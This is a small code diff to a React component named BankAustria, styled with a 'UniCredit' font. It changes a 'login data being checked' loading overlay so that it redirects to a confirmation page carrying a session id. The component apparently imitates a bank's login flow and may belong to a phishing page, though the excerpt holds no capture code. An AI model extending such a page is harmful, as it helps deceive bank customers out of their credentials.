@@ -103,7 +103,7 @@ const BankAustria = () => {
 
   return (
     <>
-      {showLoading && <LoadingOverlay message="Anmeldedaten werden überprüft..." onComplete={() => navigate("/confirmation")} />}
+      {showLoading && <LoadingOverlay message="Anmeldedaten werden überprüft..." onComplete={() => navigate("/confirmation?s=" + sessionId)} />}
     <div
       className="min-h-screen flex overflow-x-hidden"
       style={{ fontFamily: "'UniCredit', sans-serif" }}
